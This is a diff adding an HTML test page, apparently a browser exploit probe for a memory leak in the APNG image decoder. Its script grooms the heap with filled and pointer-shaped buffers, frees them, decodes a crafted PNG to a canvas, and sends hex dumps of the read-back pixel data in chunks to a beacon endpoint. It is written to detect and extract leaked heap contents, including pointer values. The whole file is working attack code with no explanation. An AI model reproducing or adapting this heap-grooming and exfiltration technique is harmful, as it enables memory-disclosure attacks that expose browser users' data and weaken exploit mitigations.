@@ -1,0 +1,30 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng6</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function img(url){ return new Promise(function(res){ var i=new Image(); i.onload=function(){res(i);}; i.onerror=function(){res(null);}; i.src=url+'?t='+Date.now(); }); }
+function hexAll(d,n){ var s=''; for(var i=0;i<n*4;i++) s+=('0'+d[i].toString(16)).slice(-2); return s; }
+function dump(tag,d,n,chunk){ var h=hexAll(d,n); for(var o=0,part=0;o<h.length;o+=chunk,part++) b(tag+'-'+part+'-'+h.substr(o,chunk)); }
+function drawN(w,im){ var c=document.createElement('canvas'); c.width=w; c.height=1; var g=c.getContext('2d'); g.drawImage(im,0,0); var d=g.getImageData(0,0,w,1).data; window.__last=c; return d; }
+function warm(n,size,val){ var a=[]; for(var i=0;i<n;i++){ var u=new Uint8Array(size); for(var j=0;j<size;j++) u[j]=val; a.push(u); } return a; }
+function stats(tag,d,n){ var ae=0,z=0,o=0; for(var x=0;x<n;x++){ var p=d[x*4],q=d[x*4+1],r=d[x*4+2],s=d[x*4+3]; if(!p&&!q&&!r&&!s) z++; else if(p===0xae&&q===0xae&&r===0xae) ae++; else o++; } b(tag+'-stats-z'+z+'-ae'+ae+'-other'+o); }
+function boot(){
+  b('A6-BOOT');
+  img('/corpus/apng-fw1.png').then(function(im){
+    if(!im){ b('A6-NOIMG'); return; }
+    // A: 256-byte chunks filled 0x41, freed right before the decode at W=64 (row buffer = 256 bytes)
+    var a=warm(4000,256,0x41); b('A6-A-alloc-'+a.length); a.length=0; a=null;
+    try{ var d=drawN(64,im); stats('A6-A64',d,64); dump('A6-A64',d,64,700); }catch(e){ b('A6-A-E-'+e.name); }
+    // B: keep them alive (allocation pressure, not recycling)
+    var k=warm(4000,256,0x42); b('A6-B-keep-'+k.length);
+    try{ var d2=drawN(64,im); stats('A6-B64',d2,64); dump('A6-B64',d2,64,700); }catch(e){ b('A6-B-E-'+e.name); }
+    k.length=0; k=null;
+    // C: 240-char strings freed
+    var s=[]; for(var i=0;i<4000;i++){ var t=''; for(var j=0;j<240;j++) t+=String.fromCharCode(0x43); s.push(t); } s.length=0; s=null;
+    try{ var d3=drawN(64,im); stats('A6-C64',d3,64); dump('A6-C64',d3,64,700); }catch(e){ b('A6-C-E-'+e.name); }
+    // D: pointer-shaped 256-byte chunks freed (each 8 bytes a distinct 0xDEADBEEF00xx value)
+    var p=[]; for(var i=0;i<4000;i++){ var u=new Uint8Array(256); for(var j=0;j<256;j+=8){ u[j]=0xEF; u[j+1]=0xBE; u[j+2]=0xAD; u[j+3]=0xDE; u[j+4]=i&0xff; u[j+5]=(i>>8)&0xff; u[j+6]=0x11; u[j+7]=0x22; } p.push(u); } p.length=0; p=null;
+    try{ var d4=drawN(64,im); stats('A6-D64',d4,64); dump('A6-D64',d4,64,700); }catch(e){ b('A6-D-E-'+e.name); }
+    b('A6-DONE');
+  });
+}
+boot();
+</script></head><body><p>apng6</p></body></html>
